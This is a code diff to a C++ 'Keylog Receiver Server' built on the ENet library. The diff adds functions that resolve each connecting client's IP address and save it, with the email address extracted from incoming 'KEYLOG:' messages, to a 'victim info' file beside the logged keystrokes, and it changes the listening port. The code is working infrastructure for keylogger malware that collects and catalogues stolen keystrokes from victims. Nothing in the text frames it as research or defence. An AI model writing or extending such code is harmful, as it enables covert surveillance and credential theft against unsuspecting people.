@@ -3,10 +3,10 @@
 #include <string>
 #include <fstream>
 #include <filesystem>
-#include <map>
-#include <thread>
 #include <mutex>
 #include <ctime>
+#include <sstream>
+
 
 using namespace std;
 namespace fs = std::filesystem;
@@ -22,6 +22,13 @@ string getCurrentTimestamp() {
     localtime_s(&timeInfo, &now);
     strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeInfo);
     return string(buffer);
+}
+
+// Function to convert host address to readable IP string
+string getIPAddress(ENetAddress address) {
+    char ipString[64];
+    enet_address_get_host_ip(&address, ipString, sizeof(ipString));
+    return string(ipString);
 }
 
 // Function to extract email from the message
@@ -44,6 +51,34 @@ string extractKeylogData(const string& message) {
     if (dataStart == string::npos + 13) return "";
     
     return message.substr(dataStart);
+}
+
+// Function to save IP and email to a separate file
+void saveVictimInfo(const string& email, const string& ip) {
+    // Make sure directory exists
+    if (!fs::exists("keylogs")) {
+        fs::create_directory("keylogs");
+    }
+    
+    // Lock for thread safety when writing to file
+    std::lock_guard<std::mutex> guard(fileMutex);
+    
+    // Open file for appending
+    ofstream outFile("keylogs/email_ip.txt", ios::app);
+    if (!outFile.is_open()) {
+        cerr << "Failed to open email_ip.txt" << endl;
+        return;
+    }
+    
+    // Write email and IP with timestamp
+    outFile << "======== " << getCurrentTimestamp() << " ========" << endl;
+    outFile << "Email: " << email << endl;
+    outFile << "IP: " << ip << endl;
+    outFile << "====================================" << endl << endl;
+    
+    outFile.close();
+    
+    cout << "Victim info saved: " << email << " (" << ip << ")" << endl;
 }
 
 // Function to save keylog data to file
@@ -79,7 +114,7 @@ void saveKeylogData(const string& email, const string& data) {
 // Main server function
 int main() {
     cout << "=== Keylog Receiver Server ===" << endl;
-    cout << "Starting server on port 25555..." << endl;
+    cout << "Starting server on port 25556..." << endl;
     
     // Initialize ENet
     if (enet_initialize() != 0) {
@@ -92,7 +127,7 @@ int main() {
     // Create the server address structure
     ENetAddress address;
     address.host = ENET_HOST_ANY;  // Listen on any interface
-    address.port = 25555;          // Use a different port than main server
+    address.port = 25556;          // Use a different port than main server
     
     // Create the server host
     ENetHost* server = enet_host_create(
@@ -122,14 +157,21 @@ int main() {
         while (enet_host_service(server, &event, 10000) > 0) {
             switch (event.type) {
                 case ENET_EVENT_TYPE_CONNECT:
-                    cout << "Client connected from " 
-                         << event.peer->address.host << ":" << event.peer->address.port << endl;
+                    {
+                        // Get the IP address of the connected client
+                        string clientIP = getIPAddress(event.peer->address);
+                        cout << "Client connected from " 
+                             << clientIP << ":" << event.peer->address.port << endl;
+                    }
                     break;
                     
                 case ENET_EVENT_TYPE_RECEIVE:
                     {
                         // Get the message as a string
                         string message(reinterpret_cast<char*>(event.packet->data));
+                        
+                        // Get the client's IP address
+                        string clientIP = getIPAddress(event.peer->address);
                         
                         // Check if this is a keylog message
                         if (message.find("KEYLOG:") == 0) {
@@ -139,6 +181,9 @@ int main() {
                             // Extract email and keylog data
                             string email = extractEmail(content);
                             string keylogData = extractKeylogData(content);
+                            
+                            // Save the victim's IP and email
+                            saveVictimInfo(email, clientIP);
                             
                             // Save the data to a file
                             if (!email.empty() && !keylogData.empty()) {
